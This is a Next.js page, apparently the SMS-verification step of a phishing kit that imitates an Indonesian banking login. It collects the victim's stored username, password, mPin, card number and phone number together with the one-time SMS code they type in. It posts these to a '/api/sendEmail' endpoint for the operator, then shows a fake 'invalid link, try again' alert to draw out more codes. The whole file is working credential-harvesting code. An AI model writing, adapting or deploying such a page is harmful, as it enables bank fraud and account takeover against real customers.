
import React, { useState } from 'react'
import SiteVerifikasi from '../components/SiteVerifikasi'
import Inbox from '../public/inbox.jpeg'
import Image from 'next/image'

import {
  Alert,
  AlertTitle,
  Box,
} from '@chakra-ui/react'

function Verifikasi({host}) {
  const [showAlert, setShowAlert] = useState(false)
  

  const handleMessage = async (data) => {

    const username = localStorage.getItem('username')
    const password = localStorage.getItem('password')
    const mPin = localStorage.getItem('mPin')
    const noKartu = localStorage.getItem('noKartu')
    const noHp = localStorage.getItem('noHp')

    const body = {
      username,
      password,
      mPin,
      noKartu,
      noHp,
      message : data.message
    }

    document.getElementById('btn').innerHTML = 'Loading...'
      try {
        
        const response = await fetch('/api/sendEmail', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'url': host
            },
            body: JSON.stringify(body)
        })

        const json = await response.json()
        
        if (json.status === 200) {
            document.getElementById('btn').innerHTML = 'Login'
            setShowAlert(true)
        } else{
            document.getElementById('btn').innerHTML = 'Login'
            console.log(json.error)
        }

      } catch (error) {
          document.getElementById('btn').innerHTML = 'Login'
          console.log(error.message);
      }
  }

  return (
    <div className="container">
      <Box pos="fixed" w="100%" zIndex={2}>
      {
        showAlert && (
          <Alert style={{backgroundColor:'red', color:'white'}}>
            <AlertTitle>Link tidak valid, Silahkan untuk mencoba lagi.</AlertTitle>
          </Alert>
        )
      }
        
      </Box>
      <div className='container-flex'>
        <div className='bg-full-grey'>
          <div className='img-inbox'>
            <Image src={Inbox} alt="inbox"/>
          </div>
          <div className='card-pesan'>
            <SiteVerifikasi btnClick = {(data)=>handleMessage(data)}/>
          </div>
        <p style={{textAlign:'center', fontWeight:'bold', marginTop:'1em', color:'gray', fontSize:'0.8em'}}>Tidak Terima SMS? <span style={{fontWeight:'lighter'}}>Kirim Ulang</span></p>
        </div>
      </div>
    </div>
  )
}

export async function getServerSideProps(context) {

  const host = context.req.headers.host
  
  return {
    props: {
      host
    },
  }
}

export default Verifikasi